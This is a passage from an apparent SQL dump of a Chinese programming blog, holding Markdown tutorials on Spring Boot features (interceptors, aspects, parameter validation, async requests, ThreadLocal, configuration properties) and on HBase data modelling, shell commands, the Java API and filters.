addInterceptors(InterceptorRegistry registry) { \n        registry.addInterceptor(getTimeIntercpetor ()\n  .addPathPatterns(\"/sys/**\")\n        .excludePathPatterns(\"/sys/login\",\"/sys/quitlogin\"); \n    }\n}\n```\n## Aspect切面\n##### 熟悉Spring应该记得有一个切面的知识点,有个切面表达式,这种表达式可以用作拦截器\n##### Aspect切面拦截器*可以获取拦截后要执行的那个方法的参数*,但是无法获取request和response，如果要获取执行方法上的参数时,可以使用切面拦截器\n```java\n@Aspect\n@Component\npublic class TimeAspect {\n	\n	// 可以拿到controller调用时的参数,但是拿不到request,response\n	@Around(\"execution(* root.web.controller.UserController.*(..))\")\n	public Object handleControllerMethod(ProceedingJoinPoint pjp) throws Throwable {\n		System.out.println(\"time aspect start\");\n		Object[] args = pjp.getArgs();\n		for (Object arg:args) {\n			System.out.println(\"arg is\" + arg);\n		}\n		Long start = new Date().getTime();\n		// 调用要执行的controller方法\n		Object proceed = pjp.proceed();\n		System.out.println(\"time aspect\" + (new Date().getTime()-start));\n		System.out.println(\"time aspect end\");\n		return proceed;\n	}\n	\n}  \n// 因为有切面表达式的存在,所以只要被Spring容器扫描到注解就可以了 \n```\n## 验证注解\n### 基本使用\n验证参数注解是个挺常用的东西,比起每次都用代码验证,很明显*把注解放在请求参数对象上*进行检查更爽更快捷更规范\n```java\n@NotBlank(message=\"密码不能为空\")\nprivate String password;\n@Past(message=\"生日必须是过去的时间\")\nprivate Date birthday; \n//	@NotNull\n//	@Null\n//	@Pattern(regexp=\"\")\n//	@Size(min=1,max=2)\n//	@CreditCardNumber(ignoreNonDigitCharacters=\"\")\n//	@Email\n//	@Length(min=1,max=2)\n//	@NotBlank\n//	@NotEmpty\n//	@Range\n//	@SafeHtml\n//	@URL\n//	@AssertFalse\n//	@AssertTrue\n//	@DecimalMax\n//	@DecimalMin\n//	@Digits(integer=1,fraction=9)\n//	@Future\n//	@Past\n//	@Max\n//	@Min \n```\n这些都是参数验证用的注解,具体用法作用源码上有注释说的很明白或者百度  \n光光给参数加上这些注解还不够,还要*给controller上加上一个启动注解@Valid才能生效*\n```java\n// 该字符串只能是数字,这里可以用正则\n@PutMapping(\"/{id:\\\\d+}\")\n// @Valid会检查对象上的参数有没有验证成功\npublic User update(@Valid @RequestBody User user) {\n		return null;\n}\n```\n当发生验证错误的时候,会抛出一个异常,*controller会无法进入*,返回错误结果,显示这没有什么用,我们还是要进入controller方法,不过我们要得到错误信息,根据这些返回状态码或页面\n```java\n@PutMapping(\"/{id:\\\\d+}\")\n// 添加了BindingResult errors,那么即使验证出错也会进入方法中,错误信息存储在BindingResult\npublic User update(@Valid @RequestBody User user, BindingResult errors) {\n	// 有没有验证错误\n	if (errors.hasErrors()) {\n		errors.getAllErrors().stream().forEach(error -> {\n			System.out.println(error.getDefaultMessage());\n		});\n	}\n	return null; \n}\n```\n### 工具类扩展\n我们的问题解决了,我们不用代码来验证,依靠Spring和hibernate提供的注解来进行验证就行了  \n##### 但是很明显,这代码好丑,我还得*每次给参数列表加给@Valid注解和BindingResult对象太冗余*,每个controller方法里都这么加,看着都要吐.\n##### 我们决定做一个工具类,*自己来扫描参数对象上的验证注解然后统一返回我们自己自定义的异常*,让我们的异常拦截器来处理,异常拦截器见本人另一篇文章\n```java\n public User update(@RequestBody User user) {\n        return null;\n }\n```\n注意一下,参数对象要加验证注解,*因为我们没有加@Valid,所以参数对象上的注解毫无卵用,没谁去扫描它*  \n我们写一个自己的工具类\n```java\npublic class ValidatorUtil {\n\n    private static ValidatorFactory validatorFactory = Validation.buildDefaultValidatorFactory();\n\n    public static <T> Map<String, String> validate(T t, Class... groups) {\n        Validator validator = validatorFactory.getValidator();\n        Set validateResult = validator.validate(t, groups);\n        if (validateResult.isEmpty()) {\n            return Collections.emptyMap();\n        } else {\n            LinkedHashMap errors = Maps.newLinkedHashMap();\n            Iterator iterator = validateResult.iterator();\n            while (iterator.hasNext()) {\n                ConstraintViolation violation = (ConstraintViolation)iterator.next();\n                errors.put(violation.getPropertyPath().toString(), violation.getMessage());\n            }\n            return errors;\n        }\n    }\n\n    public static Map<String, String> validateList(Collection<?> collection) {\n        Preconditions.checkNotNull(collection);\n        Iterator iterator = collection.iterator();\n        Map errors;\n\n        do {\n            if (!iterator.hasNext()) {\n                return Collections.emptyMap();\n            }\n            Object object = iterator.next();\n            errors = validate(object, new Class[0]);\n        } while (errors.isEmpty());\n\n        return errors;\n    }\n\n    public static Map<String, String> validateObject(Object first, Object... objects) {\n        if (objects != null && objects.length > 0) {\n            return validateList(Lists.asList(first, objects));\n        } else {\n            return validate(first, new Class[0]);\n        }\n    }\n\n    public static void check(Object param) {\n        Map<String, String> map = ValidatorUtil.validateObject(param);\n        if (MapUtils.isNotEmpty(map)) {\n        	throw new CheckParamException(\"参数错误\",map.toString());\n        }\n    }\n    \n    public static String toMessage(String mapString) {\n    	return mapString.substring(mapString.indexOf(\"=\") + 1,mapString.lastIndexOf(\"}\"));\n    }\n} \n```\n里面用到的一些包是apache和google的,代码不难理解,就是*根据从check方法传递进来的参数对象来获取参数对象上的验证注解是否验证成功*,成功什么事情都不会发生,*如果有验证错误,那么会抛出一个checkParamException我们自己自定义的异常*,把错误信息和错误集合放入进去.这个异常会走到我们自己自定义的*异常拦截器*当中进行统一处理。\n```java\n  public User update(@RequestBody User user) {\n        ValidatorUtil.check(user)\n	// 参数验证成功就会走过来\n	// 如果有验证错误,它在来着之前就抛出异常来不了这里了\n	return null; \n  }\n```\n这个ValidatorUtil工具类明显很好用,我不仅可以在controller里用,我还可以在任何地方都可以检查参数对象来用。解耦,工具类方便,代码美观,使用简单\n*** \n*这些验证注解不够完成我们的需求*,Spring和hibernate并没有提供给我们QQ号的验证注解,我们得自己自定义一个验证注解来用\n```java\n@Target({ElementType.METHOD, ElementType.FIELD})\n@Retention(RetentionPolicy.RUNTIME)\n// 这个MyConstraintValidator要我们自己实现 \n@Constraint(validatedBy=MyConstraintValidator.class)\npublic @interface MyConstraint {	\n	String message();\n	Class<?>[] groups() default { };\n	Class<? extends Payload>[] payload() default { };	\n} \n\n\npublic class MyConstraintValidator implements ConstraintValidator<MyConstraint, Object> {\n	// 注解初始化时被调用\n	@Override\n	public void initialize(MyConstraint constraintAnnotation) {\n		System.out.println(\"init\");\n	}\n	\n	// 注解验证时的逻辑\n	// 第一个参数是注解挂载的对象,值\n	// 第二个参数是验证上下文对象,功能作用看源码上的注释说明\n	@Override\n	public boolean isValid(Object value, ConstraintValidatorContext context) {\n		if (value == 1) {\n			return true\n		}\n		return false;\n	}\n\n} \n```\n## 多线程处理请求\n请求过来时创建一个线程来负责执行逻辑,可以提高并发量,不过一般都用线程池来解决,所以以下这些有些鸡肋\n```java\n@RequestMapping(\"/order\")\npublic Callable<String> order() throws Exception {\n	logger.info(\"主线程开始\");\n	Callable<String> result = new Callable<String>() {\n		@Override\n		public String call() throws Exception {\n			System.out.println(\"副线程开始\");\n			Thread.sleep(1000);\n			System.out.println(\"副线程返回\");\n			return \"success\";\n			}\n		};\n	logger.info(\"主线程返回\");\n	return result;\n}\n```\n还有一种方式为DeferredResult\n```java\n@RequestMapping(\"/deferred\")\npublic DeferredResult<String> deferred() throws Exception {\n	logger.info(\"主线程开始\");\n	String requestNumber = RandomStringUtils.randomNumeric(8);\n	myQueue.startRequest(requestNumber);\n	DeferredResult<String> result = new DeferredResult<String>();\n	deferredResultHolder.getMap().put(orderNumber, result);\n	logger.info(\"主线程返回\");\n	return result;\n}\n\npublic class MyQueue {	\n	private String requestNumber;\n	public Logger logger = LoggerFactory.getLogger(getClass());\n\n	public void startRequest(requestNumber) throws Exception {\n		new Thread(()->{\n			logger.info(\"接到请求\");\n			Thread.sleep(1000);\n			this.requestNumber = requestNumber \n			logger.info(\"请求处理完毕\");\n		}).start();  \n	}\n} \n\npublic class DeferredResultHolder { \n	private Map<String, DeferredResult<String>> map = new HashMap<String, DeferredResult<String>>();\n\n	public Map<String, DeferredResult<String>> getMap() {\n		return map;\n	}\n	public void setMap(Map<String, DeferredResult<String>> map) {\n		this.map = map;\n	}\n}\n\npublic class QueueListener implements ApplicationListener<ContextRefreshedEvent>{\n	\n	@Autowired\n	private MyQueue myQueue;\n\n	@Autowired\n	private DeferredResultHolder deferredResultHolder;\n	\n	public Logger logger = LoggerFactory.getLogger(getClass());\n\n	@Override\n	public void onApplicationEvent(ContextRefreshedEvent event) {\n		new Thread(()-> {\n			while(true) {\n				// 一直监听队列\n				if (StringUtils.isNotBlank(myQueue.getRequestNumber)) {\n					String requestNumber = myQueue.getRequestNumber(); \n					logger.info(\"返回处理结果:\" + requestNumber );\n					deferredResultHolder.getMap().get(requestNumber ).setResult(\"place order success\"); \n					myQueue.setRequestNumber(null);\n				} else {\n					try {\n						Thread.sleep(100);\n					} catch (InterruptedException e) {\n						e.printStackTrace();\n					}\n				}\n			}\n		}).start(); \n	}\n} \n``` \n##### 这些方式太鸡肋且麻烦不实用\n## ThreadLocal\n##### 这是一个极其好用的Map,著名网络框架Netty底层就使用了ThreadLocal进行了*线程隔离*,ThreadLocal主要作用是*利用线程封闭来控制数据*,常用于存放用户请求令牌\n```java\nprivate static final ThreadLocal<HttpServletRequest> requestHolder = new ThreadLocal<HttpServletRequest>();\n	\nprivate static final ThreadLocal<HttpServletResponse> responseHolder = new ThreadLocal<HttpServletResponse>();\n```\n1. 它的key是当前线程,一个请求对应一个线程,线程肯定是不会重复的,而且是map直接存储,复杂度是o1  \n2. 它的value是任何对象,除了request和response,你可以放任何在请求过程中需要在多层次传输的对象数据  \n3. 可以理解它是一个*当前请求内的全局变量来使用*,且不会造成并发问题,因为它是线程封闭的\n4. 注意请求结束后无论是否异常都要在拦截器返回结果前中删除ThreadLocal的值,*否则会造成内存泄漏*\n\n## 配置类对象\n我们经常把一些自定义的配置值放在application.properties中,然后通过@Value注解来获取配置中的值,像这样\n```java\n// application.properties中\nmyProject.a.aa.aaa = 1\nmyProject.a.b = 2\nmyProject.a.aa.ccc = 3\n\n// 通过@Value获取值\n@Value(${myProject.a.aa.aaa })\nprivate String aaa;\n```\n这种方式很简单,但有个很严重的问题,*如果key的值变了怎么办*.比如myProject.a.aa.aaa 变成了 myProject.one.a.aa.aaa怎么办,我需要把所有使用过@Value的地方全部改一遍,然而我也不记得哪些地方用过了\n,而且*这种用配置文件中的值直接通过注解来获取的方法很不规范*  \n*正确的方法是应该把值放入对象中*,需要的地方用get来获取值,用这种解决方案很规范且易于维护\n```java\n// 启用properties工厂\n@Configuration\n@EnableConfigurationProperties(MyProjectProperties.class)\npublic class MyProjectPropertiesConfig {\n	\n}\n\n@Component\n@ConfigurationProperties(prefix=\"myProject\")\npublic class MyProjectProperties{\n	// 对应myProject.a\n	private AProperties a= new AProperties();\n	// 对应myProject.b\n	private BProperties b= new BProperties();\n	// 对应myProject.c\n	private BProperties c= new BProperties();\n	\n	// 省略set,get...\n}\n\npublic class AProperties {\n	// 对应myProject.a.aa\n	private AAProperties aa = new AAProperties();\n	// 对应myProject.a.b\n	private int b;\n	// 省略set,get...\n}\n\npublic class AAProperties {\n	// 对应myProject.a.aa.aaa\n	private int aaa;\n	// 对应myProject.a.aa.ccc\n	private int ccc;\n	// 省略set,get...\n}\n```\n这样每个配置文件的值都在Spring启动时被放入到配置对象中了,\n这种方法*更规范更贴近面向对象的概念*\n## 路径\n有时候我们需要拦截指定的请求路径方法,但是希望支持Spring的那种路径表达式\n```java\n/*     /user/*   匹配 /user/1,/user/2,/user/aaa */ \nprivate AntPathMatcher pathMatcher = new AntPathMatcher();\nif (pathMatcher.match(\"/user/1\", \"/user/*\")) {\n	return true;\n}\n// 获取当前项目路径\nClassUtils.getDefaultClassLoader().getResource(\"\").getPath();\n```\n\n## 区分配置环境\n```xml\n<!-- application.properties中导入指定后缀环境的配置文件 -->\nspring.profiles.active=prd\n\n<!-- 区分各种环境的配置文件命名格式\n	application-dev.properties\n	application-prd.properties\n	application-test.properties\n -->\n\n```', 1, 0, 63, 0, 0, '2018-10-22 18:12:11', '2019-03-10 19:56:21', 0, 0);
INSERT INTO `article` VALUES (31, 1, 'HBase', '2018/10/1540281245_e4d7d388f80c4fb47895106cceb341b2.jpg', '## 概念\r\n#### hbase是什么 \r\n1. HBase是一个数据库,同MongoDB和Redis一样是*非关系型数据库*,但它的应用场景多用于大数据方面,它的存储数据*可以进行过滤等api操作*,很适合实现类似对象存储(OOS)的服务,*表结构设计的很巧妙*\r\n\r\n## 存储结构模型\r\n\r\nRowkey | ColumnFamily | ColumnQualifier| ColumnQualifier \r\n:-:| :-: |:-: |:-: |  \r\n rowkey1 | File |File:Path| File:Size \r\n rowkey2 | File | File:Path | File:Size  \r\n rowkey3 | File | File:Path | File:Size\r\n\r\n***\r\n1. NameSpace: 可以把NameSpace理解为Redis的16个仓库,方便在业务上划分\r\n2. Table: 数据表的名称,表名必须是能用在文件路径的合法名字\r\n3. Row: 每行记录,在表里面,*每一行代表着一个数据对象*,每一行都是以一个行键(RowKey)来进行唯一标识,行键并没有什么特定的数据类型,以二进制的字节来存储\r\n4. RowKey: 可以唯一标识一行记录,不可被改变,类似*主键id*\r\n5. Column: *HBase的列由ColumnFamily和ColumnQualifier组成*,由冒号(:)进行间隔,比如family:qualifier\r\n5. ColumnFamily: 在定义HBase表的时候需要提前设置好*列族*,表中所有的列都需要组织在列\r\n6. ColumnQualifier: 列族中的数据通过*列标识*来进行映射,可以理解为一个键值对,ColumnQualifier就是Key\r\n7. value: 列族中的数据通过*列标识*来进行映射的值\r\n8. Cell: 每一个行键,列族和列标识*共同组成一个单元*,里面会有一些额外的信息,比如时间戳\r\n9. TimeStamp: 每个值(value)都会有一个timeStamp,作为该值特定版本的*标识符*\r\n\r\n***\r\n\r\n- nameSpace=myProject 理解为database,命名空间\r\n- Table=testTable 理解为数据库的数据表\r\n- Row： 每行记录,rowkey1,rowkey2,rowkey3*一整行统称为行记录*,一共三行记录\r\n- Column: 由ColumnFamily和ColumnQualifier组成,所以*File:Path*和*File:Size*都能称为Column列\r\n- ColumnFamily,*列族,用作Column列前缀*,上面的File就是列族,列族可以设置多个,但不建议对表设计超过三个列族\r\n- ColumnQualifier: 列族的后缀,如上表的Path和Size,存储具体的value的key\r\n- value: 列族中的数据通过列标识来进行映射的值\r\n- Cell: *每一行数据共同组成一个单元*,里面会有一些额外的信息,比如创建时间之类\r\n- TimeStamp: 每个值(value)都会有一个timeStamp,作为该值特定版本的标识符 \r\n\r\n## Shell操作HBase\r\nshell的操作命令,一般都是直接操作API进行操作,但一些情况下不得不使用Shell命令\r\n- *help \'status\'*: 使用help获得全部命令的列表\r\n- *status*: 查询服务器状态\r\n- *list*: 查看所有表\r\n- *create \'FileTable\',\'fileInfo\',\'saveInfo\'*: 创建一个表\r\n- *describe \'FileTable\'*: 获得表的描述 \r\n- *alter \'FileTable\', \'cf\'*: 添加一个列族 \r\n- *alter \'FileTable\', {NAME => \'cf\', METHOD => \'delete\'}*: 删除一个列族\r\n- *put \'FileTable\', \'rowkey1\',\'fileInfo:name\',\'file1.txt\'*: 插入数据\r\n- *count \'FileTable\'*: 查询表中有多少行\r\n- *get \'FileTable\', \'rowkey1\'*: 获取一个rowkey的所有数据\r\n- *get \'FileTable\', \'rowkey1\', \'fileInfo\'*: 获得一个id,一个列簇（一个列）中的所有数据\r\n- *scan \'FileTable\'*: 查询整表数据\r\n- *scan \'FileTable\', {COLUMN=>\'fileInfo\'}*: 扫描整个列簇\r\n- *scan \'FileTable\', {COLUMNS=> \'fileInfo:name\'}*: 指定扫描其中的某个列\r\n- *scan \'FileTable\', { STARTROW => \'rowkey1\', LIMIT=>1, VERSIONS=>1}*: 除了列（COLUMNS）修饰词外，HBase还支持Limit（限制查询结果行数），STARTROW（ROWKEY起始行。会先根据这个key定位到region，再向后扫描）、STOPROW(结束行)、TIMERANGE（限定时间戳范围）、VERSIONS（版本数）、和FILTER（按条件过滤行）等。比如我们从RowKey1这个rowkey开始，找下一个行的最新版本\r\n- *scan \'FileTable\', FILTER=>\"ValueFilter(=,\'name:file1.txt’)\"*: Filter是一个非常强大的修饰词，可以设定一系列条件来进行过滤。比如我们要限制名称为file1.txt\r\n- *scan \'FileTable\', FILTER=>\"ColumnPrefixFilter(\'typ\') AND ValueFilter ValueFilter(=,\'substring:10\')\"*: FILTER中支持多个过滤条件通过括号、AND和OR的条件组合\r\n- *delete \'FileTable\',\'rowkey1\',\'fileInfo:size\'*: 通过delete命令，我们可以删除某个字段，接下来的get就无结果\r\n- *deleteall \'FileTable\',\'rowkey1\'*: 删除整行的值\r\n- *is_enabled \'FileTable\'*,*is_disabled \'FileTable\'*: 通过enable和disable来启用/禁用这个表,相应的可以通过is_enabled和is_disabled来检查表是否被禁用\r\n- *exists \'FileTable\'*: 使用exists来检查表是否存在\r\n- *disable \'FileTable\'*,*drop \'FileTable\'*: 删除表需要先将表disable\r\n\r\n## JavaApi操作HBase\r\n各种语言的Api都有,用熟悉的Java来演示,Spring中有个HbaseTemplate可以更方便使用,但这里用原始的api  \r\n先了解一下Java对HBase的*API对象模型*\r\n1. HBaseConfiguration:	HBase配置类\r\n2. HBaseAdmin:	HBase管理Admin类\r\n3. Table:  HBaseTable操作类\r\n4. Put: HBase添加操作数据模型\r\n5. Get: HBase单个查询操作数据类型\r\n6. Delete: HBase删除操作数据模型\r\n7. Scan: HBaseScan多个检索操作数据类型\r\n8. Cell: HBase每一个行键,列族和列标识共同组成一个单元\r\n9. Result: HBase查询的单个结果模型\r\n10. ResultScanner: HBase检索多个结果模型\r\n\r\n```java\r\n// 建表\r\npublic static boolean createTable(String tableName, String[] cfs) {\r\n	try (HBaseAdmin admin = (HBaseAdmin) HBaseConn.getHBaseConn().getAdmin()) {\r\n		// 是否存在\r\n		if (admin.tableExists(tableName)) {\r\n			return false;\r\n		}\r\n		HTableDescriptor tableDescriptor = new HTableDescriptor(TableName.valueOf(tableName));\r\n		// 创建定义列结构\r\n		Arrays.stream(cfs).forEach(cf -> {\r\n			HColumnDescriptor columnDescriptor = new HColumnDescriptor(cf);\r\n			columnDescriptor.setMaxVersions(1);\r\n				tableDescriptor.addFamily(columnDescriptor);\r\n		});\r\n		// admin创建操作\r\n		admin.createTable(tableDescriptor);\r\n	} catch(Exception e) {\r\n		e.printStackTrace();\r\n	}\r\n	return true;\r\n} \r\n\r\n// 删除表 \r\npublic static boolean deleteTable(String tableName) {\r\n	try (HBaseAdmin admin = (HBaseAdmin) HBaseConn.getHBaseConn().getAdmin()) {\r\n		// 先屏蔽再删除\r\n		admin.disableTable(tableName);\r\n		admin.deleteTable(tableName);\r\n	} catch(Exception e) {\r\n		e.printStackTrace();\r\n	}\r\n	return true;\r\n}\r\n// 插入一行\r\npublic static boolean putRow(String tableName, String rowKey, String cfName, String qualifier, String data) {\r\n	try(Table table = HBaseConn.getTable(tableName)) {\r\n		Put put = new Put(Bytes.toBytes(rowKey));\r\n		put.addColumn(Bytes.toBytes(cfName), Bytes.toBytes(qualifier), Bytes.toBytes(data));\r\n		table.put(put);\r\n	} catch(IOException ioe) {\r\n		ioe.printStackTrace();\r\n	}\r\n	return true;\r\n}\r\n// 批量插入一个putList\r\npublic static boolean putRows(String tableName, List<Put> puts) {\r\n	try(Table table = HBaseConn.getTable(tableName)) {\r\n		table.put(puts);\r\n	} catch(IOException ioe) {\r\n		ioe.printStackTrace();\r\n	}\r\n	return true;\r\n}\r\n\r\n// 获取单条\r\npublic static Result getRow(String tableName, String rowKey) {\r\n	try(Table table = HBaseConn.getTable(tableName)) {\r\n		Get get = new Get(Bytes.toBytes(rowKey));\r\n		return table.get(get);\r\n	} catch(IOException ioe) {\r\n		ioe.printStackTrace();\r\n	}\r\n	return null;\r\n}\r\n\r\n// 设置过滤器(后面详细)\r\npublic static Result getRow(String tableName, String rowKey, FilterList fileList) {\r\n	try(Table table = HBaseConn.getTable(tableName)) {\r\n		Get get = new Get(Bytes.toBytes(rowKey));\r\n		get.setFilter(fileList);\r\n		return table.get(get);\r\n	} catch(IOException ioe) {\r\n		ioe.printStackTrace();\r\n	}\r\n	return null;\r\n}\r\n\r\n// 检索多个结果\r\npublic static ResultScanner getScanner(String tableName) {\r\n	try(Table table = HBaseConn.getTable(tableName)) {\r\n		Scan scan = new Scan();\r\n		// 缓存的条数(HBase的一个内部机制)\r\n		scan.setCaching(1000);\r\n		return table.getScanner(scan);\r\n	} catch(IOException ioe) {\r\n		ioe.printStackTrace();\r\n	}\r\n	return null;\r\n}\r\n\r\n// 设置分页\r\npublic static ResultScanner getScanner(String tableName, String startRowKey, String endRowKey) {\r\n	try(Table table = HBaseConn.getTable(tableName)) {\r\n		Scan scan = new Scan();\r\n		scan.setStartRow(Bytes.toBytes(startRowKey));\r\n		scan.setStopRow(Bytes.toBytes(endRowKey));\r\n		scan.setCaching(1000);\r\n		return table.getScanner(scan);\r\n	} catch(IOException ioe) {\r\n		ioe.printStackTrace();\r\n	}\r\n	return null; \r\n}\r\n\r\n// 删除行\r\npublic static boolean deleteRow(String tableName, String rowKey) {\r\n	try(Table table = HBaseConn.getTable(tableName)) {\r\n		Delete delete = new Delete(Bytes.toBytes(rowKey));\r\n		table.delete(delete);\r\n	} catch(IOException ioe) {\r\n		ioe.printStackTrace();\r\n	}\r\n	return true;\r\n}\r\n\r\n// 删除列\r\npublic static boolean deleteColumnFamily(String tableName, String cfName) {\r\n	try (HBaseAdmin admin = (HBaseAdmin) HBaseConn.getHBaseConn().getAdmin()) {\r\n		admin.deleteColumn(tableName, cfName);\r\n	} catch(Exception e) {\r\n		e.printStackTrace();\r\n	}\r\n	return true;\r\n}\r\n\r\npublic static boolean deleteQualifier(String tableName, String rowKey, String cfName, String qualifier) {\r\n	try (Table table = HBaseConn.getTable(tableName)) {\r\n		Delete delete = new Delete(Bytes.toBytes(rowKey));\r\n		delete.addColumn(Bytes.toBytes(cfName), Bytes.toBytes(qualifier));\r\n		table.delete(delete);\r\n	} catch(Exception e) {\r\n		e.printStackTrace();\r\n	}\r\n	return true;\r\n}\r\n```\r\n## 过滤器\r\n过滤器就是筛选器,HBase支持五种类型的过滤器\r\n#### 基于行的过滤器\r\n1. PrefixFilter: 行的前缀匹配\r\n2. PageFilter: 基于行的分页\r\n\r\n#### 基于列的过滤器\r\n1. ColumnPrefixFilter: 列的前缀匹配\r\n2. FirstKeyOnlyFilter: 只返回每一行的第一列\r\n\r\n#### 基于单元值的过滤器\r\n1. KeyOnlyFilter: 返回的数据不包括单元值,只包含行键与列\r\n2. TimestampsFilter: 根据数据的时间戳版本进行过滤\r\n\r\n#### 基于列和单元值的过滤器 \r\n1. SingleColumnValueFilter: 对该列的单元值进行比较过滤\r\n2. SingleColumnValueExcludeFilter: 对该列的单元值进行比较过滤\r\n\r\n### 比较过滤器\r\n1. RowFilter: 行\r\n2. FamilyFilter: 列族\r\n3. QualifierFilter: 列族具体列标识\r\n4. ValueFilter: 值\r\n\r\n##### 比较过滤器通常需要一个比较运算符以及一个比较器来实现过滤 \r\n\r\n```java\r\n// 建表 \r\n@Test\r\npublic void createTable() {\r\n	// 列族名\r\n	HBaseUtil.createTable(\"FileTable\", new String[] {\"fileInfo\",\"saveInfo\"});\r\n}\r\n\r\n// 制造数据	\r\n@Test\r\npublic void addFileDetails() {\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey1\", \"fileInfo\", \"name\", \"file1.txt\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey1\", \"fileInfo\", \"type\", \"txt\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey1\", \"fileInfo\", \"size\", \"1024\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey1\", \"saveInfo\", \"creator\", \"jixin\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey2\", \"fileInfo\", \"name\", \"file2.jpg\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey2\", \"fileInfo\", \"type\", \"jpg\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey2\", \"fileInfo\", \"size\", \"1024\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey2\", \"saveInfo\", \"creator\", \"jixin\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey3\", \"fileInfo\", \"name\", \"file3.mp3\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey3\", \"fileInfo\", \"type\", \"mp3\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey3\", \"fileInfo\", \"size\", \"1024\");\r\n	HBaseUtil.putRow(\"FileTable\", \"rowkey3\", \"saveInfo\", \"creator\", \"jixin\");\r\n}\r\n\r\n\r\n// 筛选出匹配的所有的行\r\npublic void rowFilterTest() {\r\n	// BinaryComparator二进制比较器,通过字典顺序比较\r\n	Filter filter = new RowFilter(CompareOp.EQUAL, new BinaryComparator(Bytes.toBytes(\"rowkey1\")));\r\n	FilterList filterList = new FilterList(Operator.MUST_PASS_ALL, Arrays.asList(filter));\r\n	// 未过滤器可以获得rowkey1,rowkey2,rowkey3.过滤后只获得了rowkey1\r\n	ResultScanner resultScanner = HBaseUtil.getScanner(\"FileTable\", \"rowkey1\", \"rowkey3\", filterList);\r\n}\r\n\r\n// 筛选出具有特定前缀的行键的数据\r\npublic void prefixFilterTest() {\r\n	Filter filter = new PrefixFilter(Bytes.toBytes(\"rowkey2\"));\r\n	FilterList filterList = new FilterList(Operator.MUST_PASS_ALL, Arrays.asList(filter));\r\n		// 只获得了rowkey2\r\n	ResultScanner resultScanner = HBaseUtil.getScanner(\"FileTable\", \"rowkey1\", \"rowkey3\", filterList);\r\n}\r\n\r\n// 只返回每行的行键,值全部为空\r\npublic void keyOnlyFilterTest() {\r\n	Filter filter = new KeyOnlyFilter(true);\r\n	FilterList filterList = new FilterList(Operator.MUST_PASS_ALL, Arrays.asList(filter));\r\n	ResultScanner resultScanner = HBaseUtil.getScanner(\"FileTable\", \"rowkey1\", \"rowkey3\", filterList);\r\n		// 只返回了rowkey=rowkey1,rowkey2,rowkey3\r\n	resultScanner.forEach(result -> System.out.println(\"rowKey=\"+ Bytes.toString(result.getRow())));\r\n} \r\n\r\n// 按照列名的前缀来筛选单元格\r\npublic void columnPrefixFilterTest() {\r\n	Filter filter = new ColumnPrefixFilter(Bytes.toBytes(\"name\"));\r\n	FilterList filterList = new FilterList(Operator.MUST_PASS_ALL, Arrays.asList(filter));\r\n	ResultScanner resultScanner = HBaseUtil.getScanner(\"FileTable\", \"rowkey1\", \"rowkey3\", filterList);\r\n	// 只能获取列前缀为name的的结果\r\n	resultScanner.forEach(result -> {\r\n	System.out.println(\"fileName=\"+ Bytes.toString(\r\n					result.getValue(Bytes.toBytes(\"fileInfo\"),Bytes.toBytes(\"name\"))));\r\n	});\r\n}\r\n\r\n// 按照具体的值前缀来筛选单元格的过滤器\r\npublic void valueFilterTest() {\r\n	Filter filter = new ValueFilter(CompareOp.EQUAL, new BinaryPrefixComparator(Bytes.toBytes(\"file\")));\r\n	FilterList filterList = new FilterList(Operator.MUST_PASS_ALL, Arrays.asList(filter));\r\n	ResultScanner resultScanner = HBaseUtil.getScanner(\"FileTable\", \"rowkey1\", \"rowkey3\", filterList);\r\n	// 只能获取值为file的的结果\r\n	resultScanner.forEach(result -> System.out.println(\"rowKey=\"+ Bytes.toString(result.getRow())));\r\n}\r\n\r\n// 根据数据的时间戳版本进行过滤\r\npublic void timestampsFilterTest() {\r\n	Filter filter = new TimestampsFilter(Arrays.asList(155000l,1555000l));\r\n	FilterList filterList = new FilterList(Operator.MUST_PASS_ALL, Arrays.asList(filter));\r\n	ResultScanner resultScanner = HBaseUtil.getScanner(\"FileTable\", \"rowkey1\", \"rowkey3\", filterList);\r\n		// 只能获取时间戳版本的结果\r\n	resultScanner.forEach(result -> System.out.println(\"rowKey=\"+ Bytes.toString(result.getRow())));\r\n}\r\n// 混合过滤\r\npublic void FilterListTest() {\r\n	// 行前缀要求rowkey2\r\n	Filter prefixFilter = new PrefixFilter(Bytes.toBytes(\"rowkey2\"));\r\n	// 行前缀要求name\r\n	Filter columnPrefixFilter = new ColumnPrefixFilter(Bytes.toBytes(\"name\"));\r\n	// ALL: and,ONE: or\r\n	FilterList filterList = new FilterList(Operator.MUST_PASS_ALL, prefixFilter, columnPrefixFilter);\r\n	// 只获得满足混合过滤器的结果\r\n	ResultScanner resultScanner = HBaseUtil.getScanner(\"FileTable\", \"rowkey1\", \"rowkey3\", filterList);\r\n}\r\n```\r\n### Coprocessor协处理器\r\n#### 什么是协处理器\r\n1. HBase协处理器受BigTable协处理器的启发,为用户提供类库和运行时环境,使得代码能够在HBaseRegionServer和Master上处理事件通知回调\r\n\r\n#### 处理器种类\r\n1. 系统协处理器: 全局加载到RegionServer托管的所有表和Region上\\[*针对整个HBase集群的*\\]\r\n2. 表协处理器: 用户可以指定一张使用协处理器\\[*针对某一张表的*\\]\r\n3. Observer: 类似于关系型数据库的触发器\r\n##### *RegionObserver*: 提供客户端的数据操纵钩子:Get,Put,Delete,Scan等\r\n##### *MasterObserver*: 提供DDL类型的操纵钩子,如创建,删除,修改数据表等\r\n##### *WALObserver*: 提供WAL相关操作的钩子\r\n4. Endpoint: 类似于存储过程, 用于计算某列的平均值或者总和\r\n\r\n#### 应用场景\r\n1. 安全性: 例如执行Get或Put操作前,通过preGet或prePut方法检查是否允许该操作\r\n2. 引用完整性约束: HBase并不支持关系型数据库中的引用完整性约束概念,即通常所说的外键。我们可以使用协处理器增强这种约束\r\n3. 二级索引: 可以使用协处理器来维持一个二级索引\r\n\r\n#### Endpoint\r\n1. Endpoint是动态RPC插件的接口,它的实现代码被安装在服务端,从而能够通过HBasePRC唤醒\r\n2. 调用接口,它们的实现代码会被目标RegionServer远程执行\r\n3. 使用场景: 